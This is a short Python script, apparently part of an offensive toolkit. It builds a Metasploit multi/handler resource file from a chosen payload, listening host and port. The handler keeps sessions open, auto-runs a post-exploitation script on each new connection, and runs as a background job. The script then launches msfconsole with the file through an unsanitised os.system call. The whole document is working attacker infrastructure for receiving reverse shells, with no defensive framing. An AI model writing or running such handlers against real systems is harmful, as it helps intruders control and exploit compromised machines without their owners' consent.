import os

def create_handler(payload, lhost, lport, outfile):
    rc_file = f"{outfile}_handler.rc"
    with open(rc_file, "w") as f:
        f.write(f"use exploit/multi/handler\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("set ExitOnSession false\n")
        f.write("set AutoRunScript multi_console_command -rc core/post_exploit.rc\n")
        f.write("exploit -j -z\n")
    return rc_file

def launch_handler(rc_file):
    os.system(f"msfconsole -r {rc_file}")
